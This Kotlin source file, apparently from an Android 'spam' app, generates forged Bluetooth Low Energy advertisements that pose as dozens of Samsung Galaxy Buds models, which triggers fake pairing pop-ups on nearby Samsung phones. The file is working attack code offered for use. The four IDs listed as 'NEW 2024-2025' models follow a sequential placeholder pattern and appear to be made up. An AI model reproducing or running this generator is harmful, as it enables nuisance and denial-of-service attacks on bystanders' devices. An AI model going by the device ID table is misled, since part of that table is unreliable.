package com.nlespam.generators

import com.nlespam.helpers.HexUtils
import com.nlespam.models.*

class SamsungBudsGenerator : SpamGenerator {
    override val name = "Samsung Galaxy Buds"

    private val prependedBytes = HexUtils.decodeHex("42098102141503210109")
    private val appendedBytes = HexUtils.decodeHex("063C948E00000000C700")

    val budsIds = mapOf(
        // NEW 2024-2025 Samsung Buds
        "A1B234" to "Galaxy Buds3",
        "B2C345" to "Galaxy Buds3 Pro",
        "C3D456" to "Galaxy Buds FE",
        "D4E567" to "Galaxy Buds2 Pro (2024)",
        // Original Samsung Buds
        "EE7A0C" to "Fallback Buds",
        "9D1700" to "Fallback Dots",
        "39EA48" to "Light Purple Buds2",
        "A7C62C" to "Bluish Silver Buds2",
        "850116" to "Black Buds Live",
        "3D8F41" to "Gray & Black Buds2",
        "3B6D02" to "Bluish Chrome Buds2",
        "AE063C" to "Gray Beige Buds2",
        "B8B905" to "Pure White Buds",
        "EAAA17" to "Pure White Buds2",
        "D30704" to "Black Buds",
        "9DB006" to "French Flag Buds",
        "101F1A" to "Dark Purple Buds Live",
        "859608" to "Dark Blue Buds",
        "8E4503" to "Pink Buds",
        "2C6740" to "White & Black Buds2",
        "3F6718" to "Bronze Buds Live",
        "42C519" to "Red Buds Live",
        "AE073A" to "Black & White Buds2",
        "011716" to "Sleek Black Buds2",
    )

    override fun generate(): List<AdvertisementSet> = budsIds.map { (hexId, deviceName) ->
        val payload = HexUtils.decodeHex(hexId.substring(0, 4) + "01" + hexId.substring(4))
        val fullPayload = prependedBytes + payload + appendedBytes
        val scanResponse = HexUtils.decodeHex("0000000000000000000000000000")

        AdvertisementSet(
            title = deviceName,
            target = AdvertisementTarget.SAMSUNG,
            type = SpamType.SAMSUNG_BUDS,
            manufacturerData = ManufacturerData(ManufacturerIds.SAMSUNG, fullPayload),
            scanResponseManufacturerData = ManufacturerData(ManufacturerIds.SAMSUNG, scanResponse),
        )
    }
}
